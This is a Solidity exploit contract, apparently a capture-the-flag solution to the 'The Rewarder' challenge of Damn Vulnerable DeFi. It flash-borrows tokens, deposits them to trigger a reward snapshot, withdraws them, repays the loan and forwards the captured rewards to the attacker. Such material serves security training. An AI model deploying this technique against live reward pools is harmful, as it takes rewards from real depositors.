// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IDamnValuableToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address) external returns (uint256);
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

interface IRewardToken {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address) external returns (uint256);
}

contract FlashLoanTheRewarder {
    using Address for address payable;

    address payable private lenderPool;
    address payable private rewarderPool;
    address payable private attacker;
    address payable private rewardToken;

    address payable private liquidityToken;

    uint256 public testUint;

    constructor (address payable _lenderPool, address payable _liquidityToken, address payable _rewardToken, address payable _rewarderPool, address payable _attacker) {
        lenderPool = _lenderPool; //FlashLoanerPool
        liquidityToken = _liquidityToken; //DamnValuableToken
        rewarderPool = _rewarderPool; //TheRewarderPool
        rewardToken = _rewardToken; //RewardToken
        attacker = _attacker; //attacker user address
    }

    // The flashloan callback.
    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == lenderPool, "Sender must be pool");

        // Flashloan Borrow : Receive liquidity token(DTV) from LenderPool(flashloan)
        uint256 amountToBeRepaid = amount;
        //From TheRewarderPool.sol comment above deposit: 
        //sender must have approved `amountToDeposit` liquidity tokens in advance
        IDamnValuableToken(liquidityToken).approve(rewarderPool, amountToBeRepaid);
        // Deposit the liquidity token and trigger new round
        //Triggers snapshot and distribution of rewards.
        IRewarderPool(rewarderPool).deposit(amountToBeRepaid);

        // Withdraw all of the liquidity tokens again.
        IRewarderPool(rewarderPool).withdraw(amountToBeRepaid);
        // Flashloan Repayment : Pay back to LenderPool(flashloan)
        // It needs to return because 
        // require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
        IDamnValuableToken(liquidityToken).transfer(lenderPool, amountToBeRepaid);
        
    }

    // Only start the exploit if TheRewarderPool's lastRecordedSnapshotTimestamp is older than 5 days!
    function executeFlashLoanAttack(uint256 amount) external {
        // Take a loan and trigger receiveFlashLoan() fallback
        IFlashLoanerPool(lenderPool).flashLoan(amount);
        // Send reward tokens to attacker
        IRewardToken(rewardToken).transfer(
            msg.sender,
            IRewardToken(rewardToken).balanceOf(address(this))
        );
        
    }

    receive () external payable {}
}